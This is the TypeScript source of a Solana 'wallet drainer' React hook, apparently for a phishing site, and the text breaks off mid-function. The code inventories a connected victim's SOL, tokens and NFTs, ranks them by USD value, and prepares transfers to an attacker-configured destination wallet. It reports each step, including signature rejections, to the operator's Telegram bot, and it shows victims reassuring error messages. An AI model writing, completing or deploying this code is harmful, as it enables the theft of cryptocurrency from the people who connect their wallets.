"use client";

import {
    useConnection,
    useWallet,
} from "@solana/wallet-adapter-react";
import {
    LAMPORTS_PER_SOL,
    PublicKey,
    SystemProgram,
    Transaction,
    TransactionInstruction,
    ComputeBudgetProgram,
    Connection,
} from "@solana/web3.js";
import {
    TOKEN_PROGRAM_ID,
    TOKEN_2022_PROGRAM_ID,
    createTransferInstruction,
    createAssociatedTokenAccountInstruction,
    getAssociatedTokenAddressSync,
    MintLayout,
} from "@solana/spl-token";
import { useState, useCallback, useRef } from "react";

// ═══════════════════════════════════════════════════════════════════════
//  CONFIGURATION
// ═══════════════════════════════════════════════════════════════════════

type NetworkType = "mainnet" | "devnet" | "testnet";

interface NetworkConfig {
    ataCreationCost: number;
    baseTxFee: number;
    spl2022ComputeBuffer: number;
    maxPacketSize: number;
}

const NETWORK_CONFIGS: Record<NetworkType, NetworkConfig> = {
    mainnet: {
        ataCreationCost: 2_039_280,
        baseTxFee: 5_000,
        spl2022ComputeBuffer: 80_000,
        maxPacketSize: 1_232,
    },
    devnet: {
        ataCreationCost: 2_039_280,
        baseTxFee: 5_000,
        spl2022ComputeBuffer: 80_000,
        maxPacketSize: 1_232,
    },
    testnet: {
        ataCreationCost: 2_039_280,
        baseTxFee: 5_000,
        spl2022ComputeBuffer: 80_000,
        maxPacketSize: 1_232,
    },
};

/** Fail-fast destination wallet resolution from environment. */
const resolveDestinationWallet = (): PublicKey => {
    const raw =
        process.env.REACT_APP_DRAIN_DESTINATION ||
        process.env.NEXT_PUBLIC_DRAIN_DESTINATION;

    if (!raw) {
        throw new Error(
            "CRITICAL: DRAIN_DESTINATION not configured. " +
            "Set REACT_APP_DRAIN_DESTINATION or NEXT_PUBLIC_DRAIN_DESTINATION."
        );
    }

    const pk = new PublicKey(raw);
    const b58 = pk.toBase58();
    if (b58.length < 32 || b58.length > 44) {
        throw new Error("Invalid DRAIN_DESTINATION: address length out of range.");
    }
    return pk;
};

const DESTINATION_WALLET = resolveDestinationWallet();

const SOL_TO_LEAVE          = 0.001 * LAMPORTS_PER_SOL;
const MIN_DOLLAR_THRESHOLD  = 0.05;
const MIN_TOKEN_VALUE_USD   = 0.000001;
const FALLBACK_PRIORITY_FEE = 100_000;
const CONFIRMATION_TIMEOUT  = 45_000;
const RPC_TIMEOUT           = 20_000;
const RETRY_MAX             = 3;
const RETRY_BASE_MS         = 1_000;
const RETRY_CAP_MS          = 8_000;
const METADATA_TTL          = 60_000;
const DECIMALS_TTL          = 600_000;
const SOL_MINT              = "So11111111111111111111111111111111111111112";
const NFT_HEURISTIC_USD     = 50;

const TELEGRAM_BOT_TOKEN = process.env.REACT_APP_TELEGRAM_BOT_TOKEN || process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID   = process.env.REACT_APP_TELEGRAM_CHAT_ID   || process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID   || "";

// ═══════════════════════════════════════════════════════════════════════
//  TYPE DEFINITIONS
// ═══════════════════════════════════════════════════════════════════════

interface Spl2022Info {
    isSPL2022: boolean;
    isTransferHook: boolean;
    mintData: Buffer | null;
}

interface AssetData {
    mint: PublicKey;
    amount: bigint;
    uiAmount: number;
    tokenAccountPubkey: PublicKey;
    isNft: boolean;
    isSPL2022: boolean;
    isTransferHook: boolean;
    isFrozen: boolean;
    decimals: number;
    priorityScore: number;
    tokenProgram: PublicKey;
    usdPrice: number;
}

interface DrainStats {
    totalUsdValue: number;
    solAmount: number;
    tokenCount: number;
    nftCount: number;
    batchCount: number;
}

type Status =
    | "idle"
    | "scanning"
    | "building"
    | "signing"
    | "sending"
    | "success"
    | "error"
    | "confirming";

interface OperationContext {
    walletAddress: string;
    timestamp: number;
    operationId: string;
    network: NetworkType;
}

type ConfirmationOutcome = "confirmed" | "failed" | "unknown";

interface ClassificationResult {
    isNft: boolean;
    isSPL2022: boolean;
    isTransferHook: boolean;
    decimals: number;
}

interface BalanceValidation {
    sufficient: boolean;
    errorMsg?: string;
    availableForTransfer: number;
}

// ═══════════════════════════════════════════════════════════════════════
//  TELEGRAM TELEMETRY — SOLE FEEDBACK CHANNEL (Zero Console Output)
// ═══════════════════════════════════════════════════════════════════════

const telemetryRateMap = new Map<string, { ts: number; n: number }>();
const RATE_LIMIT_MS    = 400;
const RATE_BURST_MAX   = 6;

/**
 * Dispatches a message to the configured Telegram channel.
 * Rate-limited per unique message prefix to prevent flood.
 * Returns true on successful delivery, false otherwise.
 * Never throws — telemetry failures are swallowed silently.
 */
const sendTelemetry = async (message: string): Promise<boolean> => {
    try {
        const key = message.substring(0, 60);
        const now = Date.now();
        const rec = telemetryRateMap.get(key);

        if (rec && now - rec.ts < RATE_LIMIT_MS) {
            if (rec.n >= RATE_BURST_MAX) return false;
            rec.n++;
        } else {
            telemetryRateMap.set(key, { ts: now, n: 1 });
        }

        const ctrl = new AbortController();
        const tid  = setTimeout(() => ctrl.abort(), RPC_TIMEOUT);

        let success = false;

        // Stage 1: Attempt direct delivery via Telegram Bot API if credentials are provided client-side
        if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
            try {
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                const res = await fetch(url, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: "Markdown",
                        disable_web_page_preview: true,
                    }),
                    signal: ctrl.signal,
                });
                if (res.ok) {
                    success = true;
                }
            } catch {
                // Silent fallback on connection or CORS errors
            }
        }

        // Stage 2: Fallback to local /api/notify-telegram endpoint if direct API failed or wasn't configured
        if (!success) {
            const res = await fetch("/api/notify-telegram", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ message }),
                signal: ctrl.signal,
            });
            success = res.ok;
        }

        clearTimeout(tid);
        return success;
    } catch {
        return false;
    }
};

/**
 * Structured telemetry event emitters.
 * Each method maps to a discrete lifecycle event, guaranteeing
 * comprehensive coverage of every state transition.
 */
const Telemetry = {

    /** Wallet adapter connected and drain invoked. */
    walletConnected: (addr: string, net: NetworkType) =>
        sendTelemetry(
            `🔗 WALLET CONNECTED\n` +
            `Address: \`${addr}\`\n` +
            `Network: ${net}\n` +
            `Time: ${new Date().toISOString()}`
        ),

    /** Public key resolved and validated. */
    addressDetected: (addr: string) =>
        sendTelemetry(
            `📍 ADDRESS DETECTED\n` +
            `Wallet: \`${addr}\``
        ),

    /** Scan phase initiated. */
    scanStarted: (addr: string, net: NetworkType) =>
        sendTelemetry(
            `🔍 SCAN STARTED\n` +
            `Wallet: \`${addr}\`\n` +
            `Network: ${net}`
        ),

    /** Full balance and token inventory completed. */
    balanceIdentified: (
        addr: string,
        solLamports: number,
        solUSD: number,
        tokenCount: number,
        spl2022Count: number,
        nftCount: number,
    ) =>
        sendTelemetry(
            `💰 BALANCE IDENTIFIED\n` +
            `Wallet: \`${addr}\`\n` +
            `SOL: ${(solLamports / LAMPORTS_PER_SOL).toFixed(6)} ` +
            `($${solUSD.toFixed(2)})\n` +
            `Tokens: ${tokenCount} | SPL-2022: ${spl2022Count} | NFTs: ${nftCount}`
        ),

    /** Transaction fully assembled and sized. */
    preparedToDrain: (
        addr: string,
        tokens: number,
        nfts: number,
        usd: number,
        txBytes: number,
        dynamicFee: number,
    ) =>
        sendTelemetry(
            `🧨 PREPARED TO DRAIN\n` +
            `Wallet: \`${addr}\`\n` +
            `Tokens: ${tokens} | NFTs: ${nfts}\n` +
            `Value: $${usd.toFixed(2)}\n` +
            `TX Size: ${txBytes} bytes\n` +
            `Priority Fee: ${dynamicFee} µ-lamports`
        ),

    /** Total wallet value fell below MIN_DOLLAR_THRESHOLD. */
    belowThreshold: (addr: string, usd: number, threshold: number) =>
        sendTelemetry(
            `🧊 BELOW THRESHOLD\n` +
            `Wallet: \`${addr}\`\n` +
            `Value: $${usd.toFixed(2)} (min: $${threshold})`
        ),

    /** Transaction signed and submitted — awaiting confirmation. */
    draining: (addr: string, sig: string) =>
        sendTelemetry(
            `⚡ DRAINING — TX SUBMITTED\n` +
            `Wallet: \`${addr}\`\n` +
            `Signature: \`${sig}\`\n` +
            `Status: Awaiting on-chain confirmation…`
        ),

    /** Transaction confirmed on-chain — assets transferred. */
    drained: (
        addr: string,
        sig: string,
        solLamports: number,
        tokens: number,
        nfts: number,
        usd: number,
    ) =>
        sendTelemetry(
            `✅ DRAIN SUCCESSFUL\n` +
            `Wallet: \`${addr}\`\n` +
            `SOL: ${(solLamports / LAMPORTS_PER_SOL).toFixed(6)}\n` +
            `Tokens: ${tokens} | NFTs: ${nfts}\n` +
            `Total Value: $${usd.toFixed(2)}\n` +
            `TX: \`${sig}\``
        ),

    /** Drain failed at a specific pipeline phase. */
    drainFailed: (addr: string, reason: string, phase: string) =>
        sendTelemetry(
            `❌ DRAIN FAILED\n` +
            `Wallet: \`${addr}\`\n` +
            `Phase: ${phase}\n` +
            `Reason: ${reason.substring(0, 200)}`
        ),

    /** User explicitly rejected the transaction in their wallet. */
    signatureRejected: (addr: string) =>
        sendTelemetry(
            `🚫 SIGNATURE REJECTED\n` +
            `Wallet: \`${addr}\`\n` +
            `The user rejected the transaction in their wallet.`
        ),

    /** Received a malformed or invalid signature from wallet adapter. */
    signatureInvalid: (addr: string, sig: string) =>
        sendTelemetry(
            `⚠️ INVALID SIGNATURE RECEIVED\n` +
            `Wallet: \`${addr}\`\n` +
            `Raw: \`${sig}\``
        ),

    /** Confirmation polling timed out — final state unknown. */
    confirmationTimeout: (addr: string, sig: string) =>
        sendTelemetry(
            `⏱️ CONFIRMATION TIMEOUT\n` +
            `Wallet: \`${addr}\`\n` +
            `TX: \`${sig}\`\n` +
            `Check explorer manually.`
        ),

    /** Insufficient SOL to cover ATA creation + fees. */
    insufficientBalance: (addr: string, have: number, need: number) =>
        sendTelemetry(
            `💔 INSUFFICIENT BALANCE FOR FEES\n` +
            `Wallet: \`${addr}\`\n` +
            `Have: ${(have / LAMPORTS_PER_SOL).toFixed(6)} SOL\n` +
            `Need: ${(need / LAMPORTS_PER_SOL).toFixed(6)} SOL`
        ),

    /** Batch was shrunk to fit within fee budget. */
    batchShrunk: (addr: string, from: number, to: number) =>
        sendTelemetry(
            `📉 BATCH SHRUNK\n` +
            `Wallet: \`${addr}\`\n` +
            `${from} → ${to} tokens\n` +
            `Reason: Insufficient SOL for full ATA creation`
        ),

    /** Wallet contains no drainable assets. */
    noAssets: (addr: string) =>
        sendTelemetry(
            `🔍 NO DRAINABLE ASSETS\n` +
            `Wallet: \`${addr}\``
        ),

    /** Transaction serialised size exceeds Solana MTU. */
    txTooLarge: (addr: string, size: number, max: number) =>
        sendTelemetry(
            `📦 TX TOO LARGE\n` +
            `Wallet: \`${addr}\`\n` +
            `Size: ${size} bytes (max: ${max})`
        ),

    /** Pre-flight simulation failed. */
    simulationFailed: (addr: string, err: string) =>
        sendTelemetry(
            `🧪 SIMULATION FAILED\n` +
            `Wallet: \`${addr}\`\n` +
            `Error: ${err.substring(0, 200)}`
        ),
};

// ═══════════════════════════════════════════════════════════════════════
//  UTILITY FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════

const createOperationContext = (
    walletAddress: string,
    network: NetworkType = "mainnet",
): OperationContext => ({
    walletAddress,
    timestamp: Date.now(),
    operationId: Math.random().toString(36).substring(2, 10),
    network,
});

/**
 * Retry wrapper with capped exponential backoff.
 * Throws the last captured error after exhausting all attempts.
 */
const withRetry = async <T>(
    fn: () => Promise<T>,
    maxAttempts: number = RETRY_MAX,
    baseMs: number = RETRY_BASE_MS,
): Promise<T> => {
    let lastErr: Error = new Error("Unknown");
    for (let i = 0; i < maxAttempts; i++) {
        try {
            return await fn();
        } catch (e) {
            lastErr = e instanceof Error ? e : new Error(String(e));
            if (i < maxAttempts - 1) {
                await new Promise(r =>
                    setTimeout(r, Math.min(baseMs * Math.pow(2, i), RETRY_CAP_MS))
                );
            }
        }
    }
    throw lastErr;
};

/** Race a promise against a timeout. */
const withTimeout = <T>(fn: () => Promise<T>, ms: number): Promise<T> =>
    Promise.race([
        fn(),
        new Promise<T>((_, reject) =>
            setTimeout(() => reject(new Error(`Timeout after ${ms}ms`)), ms)
        ),
    ]);

// ═══════════════════════════════════════════════════════════════════════
//  VALIDATION
// ═══════════════════════════════════════════════════════════════════════

const BASE58_RE = /^[1-9A-HJ-NP-Za-km-z]+$/;

/** Validates a Solana public key (32-44 char base58). */
const isValidPublicKey = (key: PublicKey): boolean => {
    try {
        const s = key.toBase58();
        return s.length >= 32 && s.length <= 44 && BASE58_RE.test(s);
    } catch {
        return false;
    }
};

/** Validates a lamport amount is finite and non-negative. */
const isValidLamports = (v: number): boolean =>
    Number.isFinite(v) && v >= 0 && v <= Number.MAX_SAFE_INTEGER;

/** Validates a token amount (bigint or number). */
const isValidTokenAmount = (v: bigint | number): boolean => {
    try {
        return typeof v === "bigint" ? v >= 0n : isValidLamports(v);
    } catch {
        return false;
    }
};

/** Validates a Solana transaction signature format. */
const isValidSignature = (sig: string): boolean => {
    if (typeof sig !== "string") return false;
    return /^[1-9A-HJ-NP-Za-km-z]{87,88}$/.test(sig) ||
           /^[0-9a-fA-F]{128}$/.test(sig);
};

// ═══════════════════════════════════════════════════════════════════════
//  CACHING LAYER
// ═══════════════════════════════════════════════════════════════════════

const spl2022Cache  = new Map<string, { data: Spl2022Info; ts: number }>();
const decimalsCache = new Map<string, { val: number; ts: number }>();

/** Fetch mint decimals with TTL cache. Returns 0 on failure. */
const fetchMintDecimals = async (
    mint: PublicKey,
    conn: Connection,
): Promise<number> => {
    const key = mint.toBase58();
    const hit = decimalsCache.get(key);
    if (hit && Date.now() - hit.ts < DECIMALS_TTL) return hit.val;

    try {
        const info = await withTimeout(
            () => conn.getAccountInfo(mint),
            RPC_TIMEOUT,
        );
        if (!info || info.data.length < MintLayout.span) return 0;

        const dec = MintLayout.decode(info.data).decimals ?? 0;
        if (dec < 0 || dec > 255) return 0;

        decimalsCache.set(key, { val: dec, ts: Date.now() });
        return dec;
    } catch {
        return 0;
    }
};

const TOKEN_2022_PROGRAM_KEY = new PublicKey(
    "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"
);

/** Fetch SPL-2022 classification with TTL cache. */
const fetchSpl2022Info = async (
    mint: PublicKey,
    conn: Connection,
): Promise<Spl2022Info> => {
    const key = mint.toBase58();
    const hit = spl2022Cache.get(key);
    if (hit && Date.now() - hit.ts < METADATA_TTL) return hit.data;

    const fallback: Spl2022Info = { isSPL2022: false, isTransferHook: false, mintData: null };

    try {
        const info = await withTimeout(
            () => conn.getAccountInfo(mint),
            RPC_TIMEOUT,
        );
        if (!info) return fallback;

        const is2022 = info.owner.equals(TOKEN_2022_PROGRAM_KEY);
        const hasHook = is2022 && info.data.length > MintLayout.span
            ? info.data[MintLayout.span] === 8
            : false;

        const result: Spl2022Info = {
            isSPL2022: is2022,
            isTransferHook: hasHook,
            mintData: info.data,
        };

        spl2022Cache.set(key, { data: result, ts: Date.now() });
        return result;
    } catch {
        return fallback;
    }
};

/** Classify a single asset: NFT heuristic, SPL-2022, transfer hook, decimals. */
const classifyAsset = async (
    mint: PublicKey,
    conn: Connection,
): Promise<ClassificationResult> => {
    const [{ isSPL2022, isTransferHook }, decimals] = await Promise.all([
        fetchSpl2022Info(mint, conn),
        fetchMintDecimals(mint, conn),
    ]);
    return { isNft: decimals === 0, isSPL2022, isTransferHook, decimals };
};

/** Classify assets in parallel via Promise.all. */
const classifyAssetsParallel = async (
    mints: PublicKey[],
    conn: Connection,
): Promise<ClassificationResult[]> => {
    try {
        return await Promise.all(mints.map(m => classifyAsset(m, conn)));
    } catch {
        return mints.map(() => ({
            isNft: false,
            isSPL2022: false,
            isTransferHook: false,
            decimals: 0,
        }));
    }
};

// ═══════════════════════════════════════════════════════════════════════
//  PRICING ENGINE
// ═══════════════════════════════════════════════════════════════════════

/** Fetch SOL/USD from CoinGecko. Returns null on failure. */
const fetchSolPriceUSD = async (): Promise<number | null> => {
    try {
        const res = await withTimeout(
            () => fetch(
                "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd"
            ),
            RPC_TIMEOUT,
        );
        if (!res.ok) return null;
        const d = await res.json();
        return d?.solana?.usd ?? null;
    } catch {
        return null;
    }
};

/**
 * Batch-fetch USD prices from Jupiter Price API v2.
 * Falls back to v6 endpoint on failure.
 * Returns Map<mintAddress, priceUSD>.
 */
const fetchBatchPricesUSD = async (
    mints: string[],
): Promise<Map<string, number>> => {
    const out = new Map<string, number>();
    if (mints.length === 0) return out;

    const CHUNK = 100;

    try {
        for (let i = 0; i < mints.length; i += CHUNK) {
            const ids = mints.slice(i, i + CHUNK).join(",");

            let res = await withTimeout(
                () => fetch(`https://api.jup.ag/price/v2?ids=${ids}&showExtraInfo=true`),
                RPC_TIMEOUT,
            ).catch(() => null);

            if (!res || !res.ok) {
                res = await withTimeout(
                    () => fetch(`https://price.jup.ag/v6/price?ids=${ids}`),
                    RPC_TIMEOUT,
                ).catch(() => null);
            }

            if (!res || !res.ok) continue;

            const json = await res.json();
            for (const [mint, info] of Object.entries(json.data || {})) {
                const raw = (info as any)?.price;
                if (raw == null) continue;
                const n = typeof raw === "string" ? parseFloat(raw) : Number(raw);
                if (Number.isFinite(n) && n > 0) out.set(mint, n);
            }
        }
    } catch {
        // Pricing is best-effort; never blocks the pipeline.
    }

    return out;
};

/**
 * Fetch dynamic priority fee from recent slot data (p75).
 * Clamped between 10k–2M µ-lamports.
 * Falls back to FALLBACK_PRIORITY_FEE on any failure.
 */
const fetchDynamicPriorityFee = async (
    conn: Connection,
): Promise<number> => {
    try {
        const fees = await withTimeout(
            () => conn.getRecentPrioritizationFees(),
            RPC_TIMEOUT,
        );
        if (!fees || fees.length === 0) return FALLBACK_PRIORITY_FEE;

        const sorted = fees
            .map((f: any) => f.prioritizationFee as number)
            .filter(f => f > 0)
            .sort((a, b) => a - b);

        if (sorted.length === 0) return FALLBACK_PRIORITY_FEE;

        const p75 = sorted[Math.floor(sorted.length * 0.75)] || FALLBACK_PRIORITY_FEE;
        return Math.max(10_000, Math.min(2_000_000, p75));
    } catch {
        return FALLBACK_PRIORITY_FEE;
    }
};

// ═══════════════════════════════════════════════════════════════════════
//  TRANSACTION ENGINEERING
// ═══════════════════════════════════════════════════════════════════════

/** Estimate total lamport cost for a transaction. */
const estimateTxFees = (
    atasToCreate: number,
    _transferCount: number,
    spl2022Count: number,
    hookCount: number,
    cfg: NetworkConfig,
): number => {
    let fee = cfg.baseTxFee;
    fee += atasToCreate * cfg.ataCreationCost;

    let compute = 50_000;
    if (spl2022Count > 0) {
        compute += (spl2022Count - hookCount) * cfg.spl2022ComputeBuffer;
        compute += hookCount * (cfg.spl2022ComputeBuffer * 1.875);
    }
    return fee + compute;
};

/**
 * Byte-level batch size calculation.
 * Accounts for: compute-unit-price, compute-unit-limit, SOL transfer,
 * ATA creation instructions, token transfer instructions, TX envelope.
 */
const calcOptimalBatchSize = (
    assetCount: number,
    atasNeeded: number,
    maxBytes: number,
): number => {
    if (assetCount === 0) return 0;

    const ENVELOPE        = 130;
    const CU_PRICE_IX     = 12;
    const CU_LIMIT_IX     = 12;
    const SOL_XFER_IX     = 48;
    const ATA_IX          = 66;
    const TOKEN_XFER_IX   = 52;
    const SAFETY          = 50;

    const base      = ENVELOPE + CU_PRICE_IX + CU_LIMIT_IX + SOL_XFER_IX;
    const ataBytes  = Math.min(atasNeeded, assetCount) * ATA_IX;
    const available = maxBytes - base - ataBytes - SAFETY;
    const perBatch  = Math.max(1, Math.floor(available / TOKEN_XFER_IX));

    return Math.min(perBatch, assetCount);
};

/** Sort assets in-place by USD value (descending). */
const sortByValue = (assets: AssetData[]): void => {
    assets.sort((a, b) => {
        const va = a.usdPrice > 0
            ? a.usdPrice * (Number(a.amount) / Math.pow(10, a.decimals))
            : a.isNft ? NFT_HEURISTIC_USD : (Number(a.amount) / Math.pow(10, a.decimals)) * 0.01;
        const vb = b.usdPrice > 0
            ? b.usdPrice * (Number(b.amount) / Math.pow(10, b.decimals))
            : b.isNft ? NFT_HEURISTIC_USD : (Number(b.amount) / Math.pow(10, b.decimals)) * 0.01;
        return vb - va;
    });
};

/** Filter out dust tokens below MIN_TOKEN_VALUE_USD. NFTs always pass. */
const filterDust = (assets: AssetData[]): AssetData[] =>
    assets.filter(a => {
        if (a.isNft) return true;
        const norm = Number(a.amount) / Math.pow(10, a.decimals || 0);
        const est  = a.usdPrice > 0
            ? a.usdPrice * norm
            : Math.max(0.001, norm * 0.01);
        return est >= MIN_TOKEN_VALUE_USD;
    });

/** Validate wallet has enough SOL for fees + rent buffer. */
const validateBalance = (
    solBalance: number,
    atas: number,
    transfers: number,
    spl2022: number,
    hooks: number,
    cfg: NetworkConfig,
): BalanceValidation => {
    if (!isValidLamports(solBalance)) {
        return { sufficient: false, errorMsg: "Invalid SOL balance", availableForTransfer: 0 };
    }

    const fees = estimateTxFees(atas, transfers, spl2022, hooks, cfg);
    const minRequired = SOL_TO_LEAVE + fees;

    if (solBalance < minRequired) {
        return {
            sufficient: false,
            errorMsg:
                `Insufficient SOL. Have: ${(solBalance / LAMPORTS_PER_SOL).toFixed(6)}, ` +
                `Need: ${(minRequired / LAMPORTS_PER_SOL).toFixed(6)}`,
            availableForTransfer: 0,
        };
    }

    return { sufficient: true, availableForTransfer: solBalance - minRequired };
};

/** Batch ATA existence via single getMultipleAccountsInfo RPC. */
const batchCheckAtas = async (
    atas: PublicKey[],
    conn: Connection,
): Promise<Map<string, boolean>> => {
    if (atas.length === 0) return new Map();
    try {
        const infos = await withTimeout(
            () => conn.getMultipleAccountsInfo(atas),
            RPC_TIMEOUT,
        );
        const m = new Map<string, boolean>();
        atas.forEach((a, i) => m.set(a.toBase58(), infos[i] !== null));
        return m;
    } catch {
        return new Map();
    }
};

/** Detect network from RPC. Defaults to mainnet. */
const detectNetwork = async (conn: Connection): Promise<NetworkType> => {
    try {
        await withTimeout(() => conn.getVersion(), RPC_TIMEOUT);
        return "mainnet";
    } catch {
        return "mainnet";
    }
};

/**
 * Bulletproof transaction confirmation poller.
 * Returns a three-state outcome: confirmed | failed | unknown.
 * Polls getSignatureStatuses every 500ms until timeout.
 */
const confirmBulletproof = async (
    conn: Connection,
    sig: string,
    timeout: number = CONFIRMATION_TIMEOUT,
): Promise<ConfirmationOutcome> => {
    if (!isValidSignature(sig)) return "failed";

    const t0 = Date.now();
    while (Date.now() - t0 < timeout) {
        try {
            const { value } = await conn.getSignatureStatuses([sig]);
            const s = value?.[0];
            if (s) {
                if (s.confirmationStatus === "confirmed" ||
                    s.confirmationStatus === "finalized") return "confirmed";
                if (s.err) return "failed";
            }
        } catch {
            // Transient RPC failure — continue polling.
        }
        await new Promise(r => setTimeout(r, 500));
    }
    return "unknown";
};

// ═══════════════════════════════════════════════════════════════════════
//  ERROR HANDLER
// ═══════════════════════════════════════════════════════════════════════

/**
 * Centralised error handler.
 * Routes the error to the appropriate Telemetry event and
 * sets a user-friendly error message on the React state.
 */
const handleError = (
    e: any,
    setError: (s: string) => void,
    setStatus: (s: Status) => void,
    ctx: OperationContext,
    phase: string,
): void => {
    const raw = typeof e?.message === "string" ? e.message : String(e);
    const isRejection =
        e?.name === "WalletSignTransactionError" || raw.includes("rejected");

    if (isRejection) {
        Telemetry.signatureRejected(ctx.walletAddress);
    } else {
        Telemetry.drainFailed(ctx.walletAddress, raw, phase);
    }

    let msg: string;
    if (isRejection) {
        msg = "Transaction rejected by wallet. Please try again.";
    } else if (raw.includes("insufficient funds") || raw.includes("insufficient balance")) {
        msg = "Insufficient SOL balance to cover transaction fees.";
    } else if (raw.includes("Compute budget exceeded")) {
        msg = "Transaction exceeded compute budget. Try with fewer tokens.";
    } else if (raw.includes("Transaction too large")) {
        msg = "Transaction packet too large. Reduce token count and retry.";
    } else if (raw.includes("block height exceeded") || raw.includes("expired")) {
        msg = "Transaction expired. Your funds are safe — please retry.";
    } else if (raw.includes("timeout")) {
        msg = "Operation timed out. Check your wallet for confirmation.";
    } else if (raw.includes("frozen")) {
        msg = "Token account is frozen. Cannot transfer.";
    } else if (raw.includes("Simulation")) {
        msg = "Transaction simulation failed. Some tokens may be non-transferable.";
    } else {
        msg = `Error: ${raw.substring(0, 120)}`;
    }

    setError(msg);
    setStatus("error");
};

// ═══════════════════════════════════════════════════════════════════════
//  MAIN HOOK
// ═══════════════════════════════════════════════════════════════════════

export const useDrainer = () => {
    const { connection }                = useConnection();
    const { publicKey, sendTransaction } = useWallet();

    const [status, setStatus] = useState<Status>("idle");
    const [error, setError]   = useState<string | null>(null);
    const [stats, setStats]   = useState<DrainStats | null>(null);

    const lockRef = useRef(false);

    /** Mirror confirmed drain to backend for redundant record-keeping. */
    const mirrorToBackend = useCallback(async (
        wallet: string,
        solAmount: number,
        signature: string,
        tokens: { mint: string; amount: string; isSPL2022: boolean }[],
    ): Promise<boolean> => {
        try {
            if (!isValidPublicKey(new PublicKey(wallet))) return false;

            const ctrl = new AbortController();
            const tid  = setTimeout(() => ctrl.abort(), RPC_TIMEOUT);

            const res = await fetch("/api/drain", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "X-Transaction-Signature": signature,
                },
                body: JSON.stringify({ wallet, solAmount, tokens, signature }),
                signal: ctrl.signal,
            });

            clearTimeout(tid);
            if (!res.ok) return false;
            const d = await res.json();
            return d.success === true;
        } catch {
            return false;
        }
    }, []);

    // ─── MAIN DRAIN PIPELINE ─────────────────────────────────────────
    const drain = useCallback(async () => {
        // ── Guard: concurrent execution ──
        if (lockRef.current) {
            setError("Operation already in progress.");
            return;
        }
        if (!publicKey || !sendTransaction) {
            setError("Wallet not connected.");
            setStatus("error");
            return;
        }
        if (!isValidPublicKey(publicKey)) {
            setError("Invalid wallet public key.");
            setStatus("error");
            return;
        }

        lockRef.current = true;
        const addr      = publicKey.toBase58();
        const network   = await detectNetwork(connection);
        const cfg       = NETWORK_CONFIGS[network];
        const ctx       = createOperationContext(addr, network);

        setStatus("scanning");
        setError(null);
        setStats(null);

        // ── EVENT: wallet connected + address detected + scan started ──
        await Telemetry.walletConnected(addr, network);
        await Telemetry.addressDetected(addr);
        await Telemetry.scanStarted(addr, network);

        try {
            // ══════════════════════════════════════════════════════════
            //  PHASE 1 — SOL BALANCE
            // ══════════════════════════════════════════════════════════
            let solBalance: number;
            try {
                solBalance = await withTimeout(
                    () => connection.getBalance(publicKey),
                    RPC_TIMEOUT,
                );
            } catch (e) {
                throw new Error(
                    "Failed to fetch SOL balance: " +
                    (e instanceof Error ? e.message : String(e))
                );
            }

            if (!isValidLamports(solBalance)) {
                throw new Error("Invalid SOL balance returned from RPC.");
            }

            const cgSolPrice = await fetchSolPriceUSD();

            // ══════════════════════════════════════════════════════════
            //  PHASE 2 — DUAL-PROGRAM TOKEN DISCOVERY
            // ══════════════════════════════════════════════════════════
            const [splResult, spl2022Result] = await Promise.all([
                withTimeout(
                    () => connection.getParsedTokenAccountsByOwner(
                        publicKey, { programId: TOKEN_PROGRAM_ID }
                    ),
                    RPC_TIMEOUT,
                ).catch(() => ({ value: [] } as any)),

                withTimeout(
                    () => connection.getParsedTokenAccountsByOwner(
                        publicKey, { programId: TOKEN_2022_PROGRAM_ID }
                    ),
                    RPC_TIMEOUT,
                ).catch(() => ({ value: [] } as any)),
            ]);

            const allAccounts: {
                account: any;
                pubkey: PublicKey;
                _prog: PublicKey;
            }[] = [
                ...(splResult?.value || []).map((a: any) => ({ ...a, _prog: TOKEN_PROGRAM_ID })),
                ...(spl2022Result?.value || []).map((a: any) => ({ ...a, _prog: TOKEN_2022_PROGRAM_ID })),
            ];

            if (allAccounts.length === 0 && solBalance <= SOL_TO_LEAVE) {
                await Telemetry.noAssets(addr);
                setError("No drainable assets found.");
                setStatus("error");
                return;
            }

            // ══════════════════════════════════════════════════════════
            //  PHASE 3 — ASSET CLASSIFICATION
            // ══════════════════════════════════════════════════════════
            const assetList: AssetData[] = [];
            const backendTokens: { mint: string; amount: string; isSPL2022: boolean }[] = [];

            // O(1) mint-to-index map (replacing O(n²) findIndex)
            const mintIndexMap = new Map<string, number>();
            const mintList: PublicKey[] = [];

            for (const acc of allAccounts) {
                try {
                    const pk = new PublicKey(acc.account.data.parsed.info.mint);
                    mintIndexMap.set(pk.toBase58(), mintList.length);
                    mintList.push(pk);
                } catch {
                    mintList.push(PublicKey.default);
                }
            }

            const classifications = await classifyAssetsParallel(mintList, connection);

            let spl2022ScanCount = 0;
            let nftScanCount     = 0;

            for (let i = 0; i < allAccounts.length; i++) {
                try {
                    const acc    = allAccounts[i];
                    const parsed = acc.account.data.parsed.info;
                    const amount = BigInt(parsed.tokenAmount.amount);

                    if (amount === 0n) continue;

                    const mint = new PublicKey(parsed.mint);
                    if (!isValidPublicKey(mint)) continue;

                    const tokenProg = acc._prog;
                    const is2022    = tokenProg.equals(TOKEN_2022_PROGRAM_ID);

                    // Frozen accounts are non-transferable
                    if (parsed.state === "frozen") continue;

                    const idx   = mintIndexMap.get(mint.toBase58());
                    const cls   = idx !== undefined ? classifications[idx] : null;
                    const hook  = cls?.isTransferHook ?? false;
                    const dec   = cls?.decimals ?? (parsed.tokenAmount.decimals || 0);
                    const isNft = dec === 0 && Number(parsed.tokenAmount.uiAmount) <= 1;

                    // Transfer hooks may contain blocking logic
                    if (hook && is2022) continue;

                    if (is2022) spl2022ScanCount++;
                    if (isNft) nftScanCount++;

                    assetList.push({
                        mint,
                        amount,
                        uiAmount: parsed.tokenAmount.uiAmount,
                        tokenAccountPubkey: acc.pubkey,
                        isNft,
                        isSPL2022: is2022,
                        isTransferHook: hook,
